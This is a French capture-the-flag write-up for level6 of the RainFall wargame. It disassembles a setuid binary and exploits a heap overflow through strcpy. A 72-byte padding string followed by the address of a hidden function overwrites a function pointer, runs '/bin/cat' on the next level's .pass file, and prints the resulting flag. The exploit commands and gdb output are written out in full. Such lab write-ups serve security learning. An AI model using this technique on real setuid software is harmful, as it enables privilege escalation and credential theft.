# 06 - Heap buffer overflow 2

- On se connecte en tant que level6:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
```

```
level6@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level7 users 5274 Mar  6  2016 level6
level6@RainFall:~$ gdb level6
```

```
(gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:     push   %ebp
   0x0804847d <+1>:     mov    %esp,%ebp
   0x0804847f <+3>:     and    $0xfffffff0,%esp
   0x08048482 <+6>:     sub    $0x20,%esp
   0x08048485 <+9>:     movl   $0x40,(%esp)
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>
   0x08048491 <+21>:    mov    %eax,0x1c(%esp)
   0x08048495 <+25>:    movl   $0x4,(%esp)
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:    mov    %eax,0x18(%esp)
   0x080484a5 <+41>:    mov    $0x8048468,%edx
   0x080484aa <+46>:    mov    0x18(%esp),%eax
   0x080484ae <+50>:    mov    %edx,(%eax)
   0x080484b0 <+52>:    mov    0xc(%ebp),%eax
   0x080484b3 <+55>:    add    $0x4,%eax
   0x080484b6 <+58>:    mov    (%eax),%eax
   0x080484b8 <+60>:    mov    %eax,%edx
   0x080484ba <+62>:    mov    0x1c(%esp),%eax
   0x080484be <+66>:    mov    %edx,0x4(%esp)
   0x080484c2 <+70>:    mov    %eax,(%esp)
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:    mov    0x18(%esp),%eax
   0x080484ce <+82>:    mov    (%eax),%eax
   0x080484d0 <+84>:    call   *%eax
   0x080484d2 <+86>:    leave
   0x080484d3 <+87>:    ret
End of assembler dump.
```


- Voyons les parties les plus importantes du programme:
```
   0x08048485 <+9>:     movl   $0x40,(%esp)
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>
   0x08048491 <+21>:    mov    %eax,0x1c(%esp)
```
> Alloue un bloc de mémoire de 0x40 (64 en décimal) octets dans la heap.

```
   0x08048495 <+25>:    movl   $0x4,(%esp)
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:    mov    %eax,0x18(%esp)
```
> Alloue un bloc de mémoire de 0x4 (4 en décimal) octets dans la heap.

```
   0x080484a5 <+41>:    mov    $0x8048468,%edx
   0x080484aa <+46>:    mov    0x18(%esp),%eax
   0x080484ae <+50>:    mov    %edx,(%eax)
```
>`0x8048468 <m>: 0x83e58955`

>Met l'adresse de `<m>` dans la seconde zone mémoire allouée par malloc.

```
   0x080484b0 <+52>:    mov    0xc(%ebp),%eax
   0x080484b3 <+55>:    add    $0x4,%eax
   0x080484b6 <+58>:    mov    (%eax),%eax
   0x080484b8 <+60>:    mov    %eax,%edx
   0x080484ba <+62>:    mov    0x1c(%esp),%eax
   0x080484be <+66>:    mov    %edx,0x4(%esp)
   0x080484c2 <+70>:    mov    %eax,(%esp)
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
```
> Copie le contenu du premier paramètre donné au programme dans la première zone mémoire allouée par malloc.

```
   0x080484ca <+78>:    mov    0x18(%esp),%eax
   0x080484ce <+82>:    mov    (%eax),%eax
   0x080484d0 <+84>:    call   *%eax
```
> Tente d'exécuter la fonction `<m>`.


```
(gdb) info functions
All defined functions:

Non-debugging symbols:
...
0x08048454  n
0x08048468  m
0x0804847c  main
...
```

```
Dump of assembler code for function m:
   0x08048468 <+0>:     push   %ebp
   0x08048469 <+1>:     mov    %esp,%ebp
   0x0804846b <+3>:     sub    $0x18,%esp
   0x0804846e <+6>:     movl   $0x80485d1,(%esp)
   0x08048475 <+13>:    call   0x8048360 <puts@plt>
   0x0804847a <+18>:    leave
   0x0804847b <+19>:    ret
End of assembler dump.
```
>`0x80485d1: "Nope"`

>Cette fonction affiche "Nope".

```
(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:     push   %ebp
   0x08048455 <+1>:     mov    %esp,%ebp
   0x08048457 <+3>:     sub    $0x18,%esp
   0x0804845a <+6>:     movl   $0x80485b0,(%esp)
   0x08048461 <+13>:    call   0x8048370 <system@plt>
   0x08048466 <+18>:    leave
   0x08048467 <+19>:    ret
End of assembler dump.
```
>`0x80485b0: "/bin/cat /home/user/level7/.pass"`

>Cette fonction affiche notre flag.


- Nous cherchons donc à éxecuter la fonction `<n>` plutôt que la fonction `<m>`. Étant donné que la zone mémoire qui stocke l'adresse de la fonction à éxecuter est allouée sur la heap juste après la zone mémoire qui devrait recevoir notre input, et que `strcpy` copie l'intégralité de la source dans la destination, il nous suffit de savoir à partir de combien de caractères l'adresse de cette fonction commence à être réécrite, et d'écrire à sa place l'adresse de la fonction `<n>`.
```
(gdb) b*0x080484d0
```

```
(gdb) r $(python -c "print 'a'*72 + 'BBBB'")
...
(gdb) x $eax
0x42424242:      <Address 0x42424242 out of bounds>
```

```
(gdb) r $(python -c "print 'a'*72 + '\x54\x84\x04\x08'")
...
(gdb) x/i $eax
  0x8048454 <n>:       push   %ebp
```

```
level6@RainFall:~$ ./level6 $(python -c "print 'a'*72 + '\x54\x84\x04\x08'")
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```